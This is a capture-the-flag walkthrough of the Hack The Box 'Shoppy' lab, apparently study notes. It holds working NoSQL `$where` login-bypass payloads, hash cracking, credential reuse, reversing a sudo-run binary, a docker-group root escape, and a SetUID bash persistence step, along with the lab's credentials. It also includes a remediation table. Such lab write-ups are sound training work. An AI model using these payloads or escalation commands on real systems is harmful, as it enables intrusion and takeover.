# Shoppy — NoSQL injection to Docker host takeover

[![Difficulty](https://img.shields.io/badge/difficulty-Easy-green)](https://app.hackthebox.com/machines/shoppy)
[![OS](https://img.shields.io/badge/OS-Linux-blue)](https://app.hackthebox.com/machines/shoppy)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=AJc53DUdt1M)

> **Attack path:** NoSQL (MongoDB `$where`) injection bypasses the admin login and dumps user hashes → crack josh's MD5 → reuse on Mattermost → find jaeger's SSH creds in a channel → reverse a password-manager binary run via sudo as deploy → deploy is in the docker group → mount the host filesystem in a container → root.

## 1 · Reconnaissance

### Port scanning

```
# nmap -p- --min-rate 10000 10.10.11.180
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat

# nmap -p 22,80,9093 -sCV 10.10.11.180
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1
80/tcp   open  http    nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
9093/tcp open  copycat?  (Go metrics endpoint - Prometheus-style output)
```

Port 80 redirects to `shoppy.htb` (add it to `/etc/hosts` along with the
subdomain found below). Port 9093 exposes Go runtime metrics (Mattermost
plugins) and is a dead end for access.

### Virtual host discovery

Fuzz the `Host` header and filter out the default 301 response (169 chars):

```
# wfuzz -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" \
    -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
    --hh 169
000047340:  200  ...  3122 Ch  "mattermost"
```

```
# echo '10.10.11.180 shoppy.htb mattermost.shoppy.htb' >> /etc/hosts
```

- `shoppy.htb` — "Shoppy Beta" countdown page; `feroxbuster` finds `/login` and `/admin` (which redirects to `/login`).
- `mattermost.shoppy.htb` — Mattermost chat instance, login required.

## 2 · Foothold

### NoSQL injection on the login

The login form behaves oddly with a single quote (request hangs, 504),
pointing at a JavaScript/Node.js backend — likely MongoDB. Classic
`$ne` operator injection fails, but the app builds a `$where` string,
which allows SQL-style injection. In the POST to `/login` send:

```
username=admin' || 'a'=='a&password=admin
```

The server evaluates `this.username == 'admin' || 'a'=='a' && ...`,
returns a 302 to `/admin` and sets a session cookie. Note the injection
only works when the username actually exists (`admin` does).

### Second injection: dump the users

Inside the admin panel, "Search for users" (`/admin/search-users`) is
also injectable. Search for:

```
admin' || 'a'=='a
```

The page offers a download of `export-search.json` containing every user:

```json
[{"_id":"<id>","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},
 {"_id":"<id>","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
```

### Crack the hash

Both are unsalted MD5. admin's hash does not crack; josh's falls to rockyou:

```
# echo '6ebcea65320589ca4f2f1ce039975995' > hashes
# john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes
remembermethisway
```

### Mattermost and the SSH credential

`josh : remembermethisway` fails on the app login but works on
`mattermost.shoppy.htb`. In the "Deploy Machine" channel, jaeger posts
credentials for a new deployment machine:

```
username: jaeger
password: Sh0ppyBest@pp!
```

## 3 · User flag

```
# ssh jaeger@shoppy.htb    # password: Sh0ppyBest@pp!
jaeger@shoppy:~$ cat user.txt
<flag>
```

## 4 · Privilege escalation

### jaeger -> deploy via the password manager

```
jaeger@shoppy:~$ sudo -l
User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

The binary prompts for a master password. Copy it off-box and inspect it:

```
# scp jaeger@shoppy.htb:/home/deploy/password-manager .
# strings -el password-manager
Sample
```

`-el` is required because the comparison string is built from wide
(16-bit) characters, so plain `strings` misses it. Run it with the
recovered master password:

```
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Please enter your master password: Sample
Access granted! Here is creds !
username: deploy
password: Deploying@pp!
```

```
jaeger@shoppy:~$ su deploy        # password: Deploying@pp!
$ bash
```

### deploy -> root via the docker group

```
deploy@shoppy:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

Membership in `docker` is equivalent to root: launch the local `alpine`
image with the host root filesystem bind-mounted into the container and
`chroot` into it:

```
deploy@shoppy:~$ docker run --rm -it -v /:/mnt alpine chroot /mnt sh
# id
uid=0(root) gid=0(root)
```

## 5 · Root flag / Domain Admin

```
# cat /root/root.txt
<flag>
```

For a persistent root shell instead of a one-off container, add an SSH
key or make bash SetUID from inside the container:

```
# chmod 4777 /bin/bash          # from the chroot container
deploy@shoppy:~$ bash -p        # on the host: euid=0(root)
```

## 6 · Impact & remediation

| Risk | Impact | Remediation |
| --- | --- | --- |
| NoSQL injection in login and user search (`$where` string concatenation) | Full auth bypass and disclosure of all users and password hashes | Never build `$where` from user input; use typed query operators and parameterized queries; validate/escape input |
| Unsalted MD5 password hashing | Weak hashes crack in seconds with rockyou/CrackStation | Use adaptive hashing (bcrypt/argon2) with per-user salts |
| Password reuse across Mattermost and SSH | Chat compromise led directly to a shell | Enforce unique credentials and an enterprise password manager; block credential sharing in chat |
| Sudo rule allowing jaeger to run deploy's binary | Hard-coded credentials recovered from the binary via `strings` | Remove hard-coded secrets from binaries; scope sudo rules to the minimum |
| deploy in the docker group | Full host compromise via container with `/` mounted | Keep users out of the docker group; restrict the Docker socket (rootless Docker, policy engines) |

## 7 · CPTS takeaways

- Recognize NoSQL backends (Node.js + hanging requests on `'`) and know both injection styles: operator injection (`$ne`, `$gt`) and `$where` string injection, which reuses classic SQL-style payloads like `admin' || 'a'=='a`.
- A single vulnerability class often appears in every handler of the same app — retest the injection on the admin "search" endpoint to dump the whole user collection.
- Crack MD5 fast: identify the format, then John/hashcat with rockyou (or CrackStation for rainbow-table speeds). Always try credential reuse against every other service found during recon (here, the Mattermost vhost).
- Internal chat platforms are prime credential-hunting grounds post-access; read every channel before moving on.
- Docker group membership equals root — memorize the `docker run -v /:/mnt alpine chroot /mnt sh` pattern; it is a CPTS staple that also applies to lxc and other group-based escapes.
